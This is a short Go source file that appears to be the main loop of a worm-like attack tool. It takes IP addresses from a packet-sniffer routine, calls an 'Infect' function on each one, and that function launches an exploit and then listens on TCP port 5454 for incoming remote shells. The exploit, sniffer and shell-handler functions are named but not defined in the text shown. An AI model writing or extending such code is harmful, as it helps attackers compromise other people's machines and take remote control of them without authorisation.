package main

import (
  //"fmt"
  //"time"
  //"bufio"
  //"os"
  "net"
)

func Infect(ip string, listener net.Listener){
  go LaunchExploit(ip)
  ListenAndHandleTCPShell(listener)
}

func main(){
  listener, _ := net.Listen("tcp4", ":5454")
  ip_passing_channel := make(chan string)
  go ListenForSnifferData(ip_passing_channel)

  for ip := range ip_passing_channel {
    Infect(ip, listener)
  }
}
